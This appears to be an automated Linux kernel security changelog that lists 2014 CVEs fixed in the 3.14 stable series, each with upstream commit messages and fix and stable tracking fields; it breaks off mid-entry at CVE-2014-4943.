    Trinity finds that mmap access to a hole while it's punched from shmem
    can prevent the madvise(MADV_REMOVE) or fallocate(FALLOC_FL_PUNCH_HOLE)
    from completing, until the reader chooses to stop; with the puncher's
    hold on i_mutex locking out all other writers until it can complete.
    
    It appears that the tmpfs fault path is too light in comparison with its
    hole-punching path, lacking an i_data_sem to obstruct it; but we don't
    want to slow down the common case.
    
    Extend shmem_fallocate()'s existing range notification mechanism, so
    shmem_fault() can refrain from faulting pages into the hole while it's
    punched, waiting instead on i_mutex (when safe to sleep; or repeatedly
    faulting when not).
    
    [akpm@linux-foundation.org: coding-style fixes]
    Signed-off-by: Hugh Dickins <hughd@google.com>
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Tested-by: Sasha Levin <sasha.levin@oracle.com>
    Cc: Dave Jones <davej@redhat.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 mm/shmem.c |   56 ++++++++++++++++++++++++++++++++++++++++++++++++++++----
 1 file changed, 52 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-23
CVE: CVE-2014-4171
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-23
Linus Commit: f00cdc6df7d7cfcabb5b740911e6788cb0802bdb
Linus Tag: 3.16
Stable Date: 2014-07-28
Stable Commit: dd78e88404ef8091f5f0132a53fdc084b3a6080b
Stable Tag: 3.14.14

CVE-2014-4171:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.14.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e205f779d1443a94b5ae81aa359cb535dd3021e
Author: Hugh Dickins <hughd@google.com>
Date:   Wed Jul 23 14:00:10 2014 -0700

    shmem: fix faulting into a hole, not taking i_mutex
    
    Commit f00cdc6df7d7 ("shmem: fix faulting into a hole while it's
    punched") was buggy: Sasha sent a lockdep report to remind us that
    grabbing i_mutex in the fault path is a no-no (write syscall may already
    hold i_mutex while faulting user buffer).
    
    We tried a completely different approach (see following patch) but that
    proved inadequate: good enough for a rational workload, but not good
    enough against trinity - which forks off so many mappings of the object
    that contention on i_mmap_mutex while hole-puncher holds i_mutex builds
    into serious starvation when concurrent faults force the puncher to fall
    back to single-page unmap_mapping_range() searches of the i_mmap tree.
    
    So return to the original umbrella approach, but keep away from i_mutex
    this time.  We really don't want to bloat every shmem inode with a new
    mutex or completion, just to protect this unlikely case from trinity.
    So extend the original with wait_queue_head on stack at the hole-punch
    end, and wait_queue item on the stack at the fault end.
    
    This involves further use of i_lock to guard against the races: lockdep
    has been happy so far, and I see fs/inode.c:unlock_new_inode() holds
    i_lock around wake_up_bit(), which is comparable to what we do here.
    i_lock is more convenient, but we could switch to shmem's info->lock.
    
    This issue has been tagged with CVE-2014-4171, which will require commit
    f00cdc6df7d7 and this and the following patch to be backported: we
    suggest to 3.1+, though in fact the trinity forkbomb effect might go
    back as far as 2.6.16, when madvise(,,MADV_REMOVE) came in - or might
    not, since much has changed, with i_mmap_mutex a spinlock before 3.0.
    Anyone running trinity on 3.0 and earlier? I don't think we need care.
    
    Signed-off-by: Hugh Dickins <hughd@google.com>
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Tested-by: Sasha Levin <sasha.levin@oracle.com>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Cc: Konstantin Khlebnikov <koct9i@gmail.com>
    Cc: Johannes Weiner <hannes@cmpxchg.org>
    Cc: Lukas Czerner <lczerner@redhat.com>
    Cc: Dave Jones <davej@redhat.com>
    Cc: <stable@vger.kernel.org>	[3.1+]
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 mm/shmem.c |   78 ++++++++++++++++++++++++++++++++++++++++--------------------
 1 file changed, 52 insertions(+), 26 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-23
CVE: CVE-2014-4171
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-07-23
Linus Commit: 8e205f779d1443a94b5ae81aa359cb535dd3021e
Linus Tag: 3.16
Stable Date: 2014-07-28
Stable Commit: 5e9a01c58c62ec8e546253d724b4c4910eea32e0
Stable Tag: 3.14.14

CVE-2014-4171:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.14.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b1a366500bd537b50c3aad26dc7df083ec03a448
Author: Hugh Dickins <hughd@google.com>
Date:   Wed Jul 23 14:00:13 2014 -0700

    shmem: fix splicing from a hole while it's punched
    
    shmem_fault() is the actual culprit in trinity's hole-punch starvation,
    and the most significant cause of such problems: since a page faulted is
    one that then appears page_mapped(), needing unmap_mapping_range() and
    i_mmap_mutex to be unmapped again.
    
    But it is not the only way in which a page can be brought into a hole in
    the radix_tree while that hole is being punched; and Vlastimil's testing
    implies that if enough other processors are busy filling in the hole,
    then shmem_undo_range() can be kept from completing indefinitely.
    
    shmem_file_splice_read() is the main other user of SGP_CACHE, which can
    instantiate shmem pagecache pages in the read-only case (without holding
    i_mutex, so perhaps concurrently with a hole-punch).  Probably it's
    silly not to use SGP_READ already (using the ZERO_PAGE for holes): which
    ought to be safe, but might bring surprises - not a change to be rushed.
    
    shmem_read_mapping_page_gfp() is an internal interface used by
    drivers/gpu/drm GEM (and next by uprobes): it should be okay.  And
    shmem_file_read_iter() uses the SGP_DIRTY variant of SGP_CACHE, when
    called internally by the kernel (perhaps for a stacking filesystem,
    which might rely on holes to be reserved): it's unclear whether it could
    be provoked to keep hole-punch busy or not.
    
    We could apply the same umbrella as now used in shmem_fault() to
    shmem_file_splice_read() and the others; but it looks ugly, and use over
    a range raises questions - should it actually be per page? can these get
    starved themselves?
    
    The origin of this part of the problem is my v3.1 commit d0823576bf4b
    ("mm: pincer in truncate_inode_pages_range"), once it was duplicated
    into shmem.c.  It seemed like a nice idea at the time, to ensure
    (barring RCU lookup fuzziness) that there's an instant when the entire
    hole is empty; but the indefinitely repeated scans to ensure that make
    it vulnerable.
    
    Revert that "enhancement" to hole-punch from shmem_undo_range(), but
    retain the unproblematic rescanning when it's truncating; add a couple
    of comments there.
    
    Remove the "indices[0] >= end" test: that is now handled satisfactorily
    by the inner loop, and mem_cgroup_uncharge_start()/end() are too light
    to be worth avoiding here.
    
    But if we do not always loop indefinitely, we do need to handle the case
    of swap swizzled back to page before shmem_free_swap() gets it: add a
    retry for that case, as suggested by Konstantin Khlebnikov; and for the
    case of page swizzled back to swap, as suggested by Johannes Weiner.
    
    Signed-off-by: Hugh Dickins <hughd@google.com>
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Suggested-by: Vlastimil Babka <vbabka@suse.cz>
    Cc: Konstantin Khlebnikov <koct9i@gmail.com>
    Cc: Johannes Weiner <hannes@cmpxchg.org>
    Cc: Lukas Czerner <lczerner@redhat.com>
    Cc: Dave Jones <davej@redhat.com>
    Cc: <stable@vger.kernel.org>	[3.1+]
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 mm/shmem.c |   24 +++++++++++++++---------
 1 file changed, 15 insertions(+), 9 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-23
CVE: CVE-2014-4171
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-07-23
Linus Commit: b1a366500bd537b50c3aad26dc7df083ec03a448
Linus Tag: 3.16
Stable Date: 2014-07-28
Stable Commit: 087c99b15f48e476bcdcdef2ed4c5d145c1c88dd
Stable Tag: 3.14.14

CVE-2014-4508:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.10.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 554086d85e71f30abe46fc014fea31929a7c6a8a
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Mon Jun 23 14:22:15 2014 -0700

    x86_32, entry: Do syscall exit work on badsys (CVE-2014-4508)
    
    The bad syscall nr paths are their own incomprehensible route
    through the entry control flow.  Rearrange them to work just like
    syscalls that return -ENOSYS.
    
    This fixes an OOPS in the audit code when fast-path auditing is
    enabled and sysenter gets a bad syscall nr (CVE-2014-4508).
    
    This has probably been broken since Linux 2.6.27:
    af0575bba0 i386 syscall audit fast-path
    
    Cc: stable@vger.kernel.org
    Cc: Roland McGrath <roland@redhat.com>
    Reported-by: Toralf Frster <toralf.foerster@gmx.de>
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Link: http://lkml.kernel.org/r/e09c499eade6fc321266dd6b54da7beb28d6991c.1403558229.git.luto@amacapital.net
    Signed-off-by: H. Peter Anvin <hpa@linux.intel.com>

 arch/x86/kernel/entry_32.S |   10 ++++++++--
 1 file changed, 8 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-23
CVE: CVE-2014-4508
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-23
Linus Commit: 554086d85e71f30abe46fc014fea31929a7c6a8a
Linus Tag: 3.16
Stable Date: 2014-06-30
Stable Commit: b83627d417975fa8681344384ac55a1c4751f55f
Stable Tag: 3.14.10

CVE-2014-4608:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.23.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 72cf90124e87d975d0b2114d930808c58b4c05e4
Author: Willy Tarreau <w@1wt.eu>
Date:   Sat Sep 27 12:31:37 2014 +0200

    lzo: check for length overrun in variable length encoding.
    
    This fix ensures that we never meet an integer overflow while adding
    255 while parsing a variable length encoding. It works differently from
    commit 206a81c ("lzo: properly check for overruns") because instead of
    ensuring that we don't overrun the input, which is tricky to guarantee
    due to many assumptions in the code, it simply checks that the cumulated
    number of 255 read cannot overflow by bounding this number.
    
    The MAX_255_COUNT is the maximum number of times we can add 255 to a base
    count without overflowing an integer. The multiply will overflow when
    multiplying 255 by more than MAXINT/255. The sum will overflow earlier
    depending on the base count. Since the base count is taken from a u8
    and a few bits, it is safe to assume that it will always be lower than
    or equal to 2*255, thus we can always prevent any overflow by accepting
    two less 255 steps.
    
    This patch also reduces the CPU overhead and actually increases performance
    by 1.1% compared to the initial code, while the previous fix costs 3.1%
    (measured on x86_64).
    
    The fix needs to be backported to all currently supported stable kernels.
    
    Reported-by: Willem Pinckaers <willem@lekkertech.net>
    Cc: "Don A. Bailey" <donb@securitymouse.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Willy Tarreau <w@1wt.eu>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 lib/lzo/lzo1x_decompress_safe.c |   43 +++++++++++++++++++++++++++++++++------
 1 file changed, 37 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4608
Break Date: 2007-07-10
Break Commit: 64c70b1cf43de158282bc1675918d503e5b15cc1
Break Tag: 2.6
Linus Fix Date: 2014-09-28
Linus Commit: 72cf90124e87d975d0b2114d930808c58b4c05e4
Linus Tag: 3.18
Stable Date: 2014-10-30
Stable Commit: 7f5f71a9265d9829577393d9005b165f28b1cd77
Stable Tag: 3.14.23

CVE-2014-4608:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.23.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit af958a38a60c7ca3d8a39c918c1baa2ff7b6b233
Author: Willy Tarreau <w@1wt.eu>
Date:   Sat Sep 27 12:31:36 2014 +0200

    Revert "lzo: properly check for overruns"
    
    This reverts commit 206a81c ("lzo: properly check for overruns").
    
    As analysed by Willem Pinckaers, this fix is still incomplete on
    certain rare corner cases, and it is easier to restart from the
    original code.
    
    Reported-by: Willem Pinckaers <willem@lekkertech.net>
    Cc: "Don A. Bailey" <donb@securitymouse.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Willy Tarreau <w@1wt.eu>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 lib/lzo/lzo1x_decompress_safe.c |   62 +++++++++++++--------------------------
 1 file changed, 21 insertions(+), 41 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4608
Break Date: 2007-07-10
Break Commit: 64c70b1cf43de158282bc1675918d503e5b15cc1
Break Tag: 2.6
Linus Fix Date: 2014-09-28
Linus Commit: af958a38a60c7ca3d8a39c918c1baa2ff7b6b233
Linus Tag: 3.18
Stable Date: 2014-10-30
Stable Commit: be73cb4d097fd2bb49a5277f80da44a72466a161
Stable Tag: 3.14.23

CVE-2014-4611:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 206204a1162b995e2185275167b22468c00d6b36
Author: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
Date:   Fri Jun 20 22:01:41 2014 -0700

    lz4: ensure length does not wrap
    
    Given some pathologically compressed data, lz4 could possibly decide to
    wrap a few internal variables, causing unknown things to happen.  Catch
    this before the wrapping happens and abort the decompression.
    
    Reported-by: "Don A. Bailey" <donb@securitymouse.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 lib/lz4/lz4_decompress.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4611
Break Date: 2013-07-09
Break Commit: cffb78b0e0b3a30b059b27a1d97500cf6464efa9
Break Tag: 3.11
Linus Fix Date: 2014-06-23
Linus Commit: 206204a1162b995e2185275167b22468c00d6b36
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: 5f32449c2863adf190b83402e9a4069cee054f9d
Stable Tag: 3.14.9

CVE-2014-4652:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 07f4d9d74a04aa7c72c5dae0ef97565f28f17b92
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Wed Jun 18 13:32:31 2014 +0200

    ALSA: control: Protect user controls against concurrent access
    
    The user-control put and get handlers as well as the tlv do not protect against
    concurrent access from multiple threads. Since the state of the control is not
    updated atomically it is possible that either two write operations or a write
    and a read operation race against each other. Both can lead to arbitrary memory
    disclosure. This patch introduces a new lock that protects user-controls from
    concurrent access. Since applications typically access controls sequentially
    than in parallel a single lock per card should be fine.
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Acked-by: Jaroslav Kysela <perex@perex.cz>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 include/sound/core.h |    2 ++
 sound/core/control.c |   31 +++++++++++++++++++++++++------
 sound/core/init.c    |    1 +
 3 files changed, 28 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4652
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-18
Linus Commit: 07f4d9d74a04aa7c72c5dae0ef97565f28f17b92
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: d8e2983ef545510f39b3b67d639d807672ee0893
Stable Tag: 3.14.9

CVE-2014-4653:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fd9f26e4eca5d08a27d12c0933fceef76ed9663d
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Wed Jun 18 13:32:33 2014 +0200

    ALSA: control: Don't access controls outside of protected regions
    
    A control that is visible on the card->controls list can be freed at any time.
    This means we must not access any of its memory while not holding the
    controls_rw_lock. Otherwise we risk a use after free access.
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Acked-by: Jaroslav Kysela <perex@perex.cz>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/control.c |   15 ++++++++++-----
 1 file changed, 10 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4653
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-18
Linus Commit: fd9f26e4eca5d08a27d12c0933fceef76ed9663d
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: 1637a83bb15491efb3e7c8cd746471ef3710e79d
Stable Tag: 3.14.9

CVE-2014-4654:
CVE-2014-4655:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 82262a46627bebb0febcc26664746c25cef08563
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Wed Jun 18 13:32:32 2014 +0200

    ALSA: control: Fix replacing user controls
    
    There are two issues with the current implementation for replacing user
    controls. The first is that the code does not check if the control is actually a
    user control and neither does it check if the control is owned by the process
    that tries to remove it. That allows userspace applications to remove arbitrary
    controls, which can cause a user after free if a for example a driver does not
    expect a control to be removed from under its feed.
    
    The second issue is that on one hand when a control is replaced the
    user_ctl_count limit is not checked and on the other hand the user_ctl_count is
    increased (even though the number of user controls does not change). This allows
    userspace, once the user_ctl_count limit as been reached, to repeatedly replace
    a control until user_ctl_count overflows. Once that happens new controls can be
    added effectively bypassing the user_ctl_count limit.
    
    Both issues can be fixed by instead of open-coding the removal of the control
    that is to be replaced to use snd_ctl_remove_user_ctl(). This function does
    proper permission checks as well as decrements user_ctl_count after the control
    has been removed.
    
    Note that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at
    beginning of the function if the control already exists is removed. This is not
    a problem though since the check is quite useless, because the lock that is
    protecting the control list is released between the check and before adding the
    new control to the list, which means that it is possible that a different
    control with the same settings is added to the list after the check. Luckily
    there is another check that is done while holding the lock in snd_ctl_add(), so
    we'll rely on that to make sure that the same control is not added twice.
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Acked-by: Jaroslav Kysela <perex@perex.cz>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/control.c |   25 +++++++++----------------
 1 file changed, 9 insertions(+), 16 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4654
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-18
Linus Commit: 82262a46627bebb0febcc26664746c25cef08563
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: 99e6d92ad48b8df440f9466c82c839b74ce95dcd
Stable Tag: 3.14.9

CVE-2014-4654:
CVE-2014-4655:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 82262a46627bebb0febcc26664746c25cef08563
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Wed Jun 18 13:32:32 2014 +0200

    ALSA: control: Fix replacing user controls
    
    There are two issues with the current implementation for replacing user
    controls. The first is that the code does not check if the control is actually a
    user control and neither does it check if the control is owned by the process
    that tries to remove it. That allows userspace applications to remove arbitrary
    controls, which can cause a user after free if a for example a driver does not
    expect a control to be removed from under its feed.
    
    The second issue is that on one hand when a control is replaced the
    user_ctl_count limit is not checked and on the other hand the user_ctl_count is
    increased (even though the number of user controls does not change). This allows
    userspace, once the user_ctl_count limit as been reached, to repeatedly replace
    a control until user_ctl_count overflows. Once that happens new controls can be
    added effectively bypassing the user_ctl_count limit.
    
    Both issues can be fixed by instead of open-coding the removal of the control
    that is to be replaced to use snd_ctl_remove_user_ctl(). This function does
    proper permission checks as well as decrements user_ctl_count after the control
    has been removed.
    
    Note that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at
    beginning of the function if the control already exists is removed. This is not
    a problem though since the check is quite useless, because the lock that is
    protecting the control list is released between the check and before adding the
    new control to the list, which means that it is possible that a different
    control with the same settings is added to the list after the check. Luckily
    there is another check that is done while holding the lock in snd_ctl_add(), so
    we'll rely on that to make sure that the same control is not added twice.
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Acked-by: Jaroslav Kysela <perex@perex.cz>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/control.c |   25 +++++++++----------------
 1 file changed, 9 insertions(+), 16 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4654
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-18
Linus Commit: 82262a46627bebb0febcc26664746c25cef08563
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: 99e6d92ad48b8df440f9466c82c839b74ce95dcd
Stable Tag: 3.14.9

CVE-2014-4656:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 883a1d49f0d77d30012f114b2e19fc141beb3e8e
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Wed Jun 18 13:32:35 2014 +0200

    ALSA: control: Make sure that id->index does not overflow
    
    The ALSA control code expects that the range of assigned indices to a control is
    continuous and does not overflow. Currently there are no checks to enforce this.
    If a control with a overflowing index range is created that control becomes
    effectively inaccessible and unremovable since snd_ctl_find_id() will not be
    able to find it. This patch adds a check that makes sure that controls with a
    overflowing index range can not be created.
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Acked-by: Jaroslav Kysela <perex@perex.cz>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/control.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4656
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-18
Linus Commit: 883a1d49f0d77d30012f114b2e19fc141beb3e8e
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: d30b5ce4b5da77451fad1f454f3d456f8d3040cf
Stable Tag: 3.14.9

CVE-2014-4656:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ac902c112d90a89e59916f751c2745f4dbdbb4bd
Author: Lars-Peter Clausen <lars@metafoo.de>
Date:   Wed Jun 18 13:32:34 2014 +0200

    ALSA: control: Handle numid overflow
    
    Each control gets automatically assigned its numids when the control is created.
    The allocation is done by incrementing the numid by the amount of allocated
    numids per allocation. This means that excessive creation and destruction of
    controls (e.g. via SNDRV_CTL_IOCTL_ELEM_ADD/REMOVE) can cause the id to
    eventually overflow. Currently when this happens for the control that caused the
    overflow kctl->id.numid + kctl->count will also over flow causing it to be
    smaller than kctl->id.numid. Most of the code assumes that this is something
    that can not happen, so we need to make sure that it won't happen
    
    Signed-off-by: Lars-Peter Clausen <lars@metafoo.de>
    Acked-by: Jaroslav Kysela <perex@perex.cz>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/core/control.c |    4 ++++
 1 file changed, 4 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4656
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-18
Linus Commit: ac902c112d90a89e59916f751c2745f4dbdbb4bd
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: 8e1853b436edc41ee4e0214cf5a2fc04201915f8
Stable Tag: 3.14.9

CVE-2014-4667:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.9.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit d3217b15a19a4779c39b212358a5c71d725822ee
Author: Xufeng Zhang <xufeng.zhang@windriver.com>
Date:   Thu Jun 12 10:53:36 2014 +0800

    sctp: Fix sk_ack_backlog wrap-around problem
    
    Consider the scenario:
    For a TCP-style socket, while processing the COOKIE_ECHO chunk in
    sctp_sf_do_5_1D_ce(), after it has passed a series of sanity check,
    a new association would be created in sctp_unpack_cookie(), but afterwards,
    some processing maybe failed, and sctp_association_free() will be called to
    free the previously allocated association, in sctp_association_free(),
    sk_ack_backlog value is decremented for this socket, since the initial
    value for sk_ack_backlog is 0, after the decrement, it will be 65535,
    a wrap-around problem happens, and if we want to establish new associations
    afterward in the same socket, ABORT would be triggered since sctp deem the
    accept queue as full.
    Fix this issue by only decrementing sk_ack_backlog for associations in
    the endpoint's list.
    
    Fix-suggested-by: Neil Horman <nhorman@tuxdriver.com>
    Signed-off-by: Xufeng Zhang <xufeng.zhang@windriver.com>
    Acked-by: Daniel Borkmann <dborkman@redhat.com>
    Acked-by: Vlad Yasevich <vyasevich@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/associola.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-03
CVE: CVE-2014-4667
Break Date: 2006-10-30
Break Commit: de76e695a5ce19c121ba7e246b45f258be678a75
Break Tag: 2.6
Linus Fix Date: 2014-06-12
Linus Commit: d3217b15a19a4779c39b212358a5c71d725822ee
Linus Tag: 3.16
Stable Date: 2014-06-26
Stable Commit: 4c6c201fa9aa76b57b98c993826c4bd9ecb0f264
Stable Tag: 3.14.9

CVE-2014-4699:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.11.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b9cd18de4db3c9ffa7e17b0dc0ca99ed5aa4d43a
Author: Tejun Heo <tj@kernel.org>
Date:   Thu Jul 3 15:43:15 2014 -0400

    ptrace,x86: force IRET path after a ptrace_stop()
    
    The 'sysret' fastpath does not correctly restore even all regular
    registers, much less any segment registers or reflags values.  That is
    very much part of why it's faster than 'iret'.
    
    Normally that isn't a problem, because the normal ptrace() interface
    catches the process using the signal handler infrastructure, which
    always returns with an iret.
    
    However, some paths can get caught using ptrace_event() instead of the
    signal path, and for those we need to make sure that we aren't going to
    return to user space using 'sysret'.  Otherwise the modifications that
    may have been done to the register set by the tracer wouldn't
    necessarily take effect.
    
    Fix it by forcing IRET path by setting TIF_NOTIFY_RESUME from
    arch_ptrace_stop_needed() which is invoked from ptrace_stop().
    
    Signed-off-by: Tejun Heo <tj@kernel.org>
    Reported-by: Andy Lutomirski <luto@amacapital.net>
    Acked-by: Oleg Nesterov <oleg@redhat.com>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 arch/x86/include/asm/ptrace.h |   16 ++++++++++++++++
 include/linux/ptrace.h        |    3 +++
 2 files changed, 19 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-07-09
CVE: CVE-2014-4699
Break Date: 2006-06-17
Break Commit: 427abfa28afedffadfca9dd8b067eb6d36bac53f
Break Tag: 2.6
Linus Fix Date: 2014-07-03
Linus Commit: b9cd18de4db3c9ffa7e17b0dc0ca99ed5aa4d43a
Linus Tag: 3.16
Stable Date: 2014-07-06
Stable Commit: b897eba830537e68a1a0a4b741c975ff705a4662
Stable Tag: 3.14.11

CVE-2014-4943:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.16.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 3cf521f7dc87c031617fd47e4b7aa2593c2f3daf
Author: Sasha Levin <sasha.levin@oracle.com>
Date:   Mon Jul 14 17:02:31 2014 -0700

    net/l2tp: don't fall back on UDP [get|set]sockopt
    
    The l2tp [get|set]sockopt() code has fallen back to the UDP functions
